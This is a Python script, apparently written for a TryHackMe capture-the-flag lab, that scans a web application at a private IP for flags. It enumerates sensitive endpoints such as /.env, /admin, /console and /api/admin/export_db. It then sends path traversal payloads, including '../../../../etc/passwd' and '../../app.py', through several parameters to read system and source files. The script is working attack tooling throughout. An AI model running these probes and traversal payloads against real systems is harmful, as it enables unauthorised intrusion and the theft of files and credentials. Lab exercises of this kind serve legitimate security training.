import requests
import re

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")

s = requests.Session()

# 1) Homepage
print("=== GET / ===")
r = s.get(f"{BASE}/", timeout=10)
print(f"Status: {r.status_code}, Length: {len(r.text)}")
print(f"Headers: {dict(r.headers)}")
# Forms, links, inputs
for m in re.finditer(r"<form[^>]*>", r.text, re.I):
    print(f"  FORM: {m.group(0)[:200]}")
for m in re.finditer(r"<input[^>]*>", r.text, re.I):
    print(f"  INPUT: {m.group(0)[:200]}")
for m in re.findall(r'href=["\']([^"\']+)["\']', r.text, re.I):
    print(f"  HREF: {m}")
for m in re.findall(r'src=["\']([^"\']+)["\']', r.text, re.I):
    print(f"  SRC: {m}")
for m in re.findall(r'action=["\']([^"\']+)["\']', r.text, re.I):
    print(f"  ACTION: {m}")
# Scripts
for m in re.finditer(r"<script[^>]*>.*?</script>", r.text, re.I | re.S):
    print(f"  SCRIPT: {m.group(0)[:300]}")
# Text
text = re.sub(r"<[^>]+>", " ", r.text)
text = re.sub(r"\s+", " ", text).strip()
print(f"  TEXT: {text[:800]}")
# Flags
for f in FLAG_RE.findall(r.text):
    print(f"  [FLAG] {f}")

# 2) Common endpoints
print("\n=== Endpoint Discovery ===")
endpoints = [
    "/login", "/register", "/admin", "/dashboard", "/api", "/api/",
    "/flag", "/robots.txt", "/sitemap.xml", "/.env", "/config",
    "/static/", "/templates/", "/debug", "/console", "/shell",
    "/api/fetch_layout", "/api/admin", "/api/admin/export_db",
    "/profile", "/user", "/users", "/search", "/upload", "/download",
    "/file", "/read", "/view", "/page", "/load", "/include",
    "/fetch", "/get", "/render", "/template", "/exec",
    "/health", "/status", "/info", "/about", "/help",
    "/secret", "/hidden", "/backup", "/test", "/dev",
    "/swagger", "/docs", "/api/docs", "/openapi.json",
    "/favicon.ico", "/static/js/", "/static/css/",
]

for ep in endpoints:
    try:
        r = s.get(f"{BASE}{ep}", timeout=5, allow_redirects=False)
        if r.status_code != 404:
            loc = r.headers.get("Location", "")
            ct = r.headers.get("Content-Type", "")[:40]
            body = r.text[:100].replace("\n", " ") if r.status_code == 200 else ""
            print(f"  {ep} -> {r.status_code} (len={len(r.text)}, ct={ct}) loc={loc} | {body}")
            for f in FLAG_RE.findall(r.text):
                print(f"    [FLAG] {f}")
    except Exception as e:
        print(f"  {ep} -> error: {e}")

# 3) Check response headers for clues
print("\n=== Response Headers ===")
r = s.get(f"{BASE}/", timeout=10)
for k, v in r.headers.items():
    print(f"  {k}: {v}")

# 4) Try the Valenfind path traversal pattern
print("\n=== Path Traversal Tests ===")
traversal_endpoints = [
    "/api/fetch_layout?layout=../../app.py",
    "/api/fetch_layout?layout=../../../../etc/passwd",
    "/load?file=../../app.py",
    "/read?file=../../app.py",
    "/view?page=../../app.py",
    "/fetch?url=../../app.py",
    "/template?name=../../app.py",
    "/page?name=../../app.py",
    "/render?template=../../app.py",
    "/include?file=../../app.py",
    "/static/../../app.py",
    "/download?file=../../app.py",
]
for ep in traversal_endpoints:
    try:
        r = s.get(f"{BASE}{ep}", timeout=5)
        if r.status_code != 404 and len(r.text) > 10:
            interesting = "import " in r.text or "root:" in r.text or "THM{" in r.text or "flask" in r.text.lower()
            marker = " *** " if interesting else ""
            print(f"  {ep} -> {r.status_code} ({len(r.text)} bytes){marker}")
            if interesting:
                print(f"    {r.text[:300]}")
            for f in FLAG_RE.findall(r.text):
                print(f"    [FLAG] {f}")
    except:
        pass

# 5) Full HTML dump of homepage
print("\n=== Full Homepage HTML (first 3000 chars) ===")
r = s.get(f"{BASE}/", timeout=10)
print(r.text[:3000])
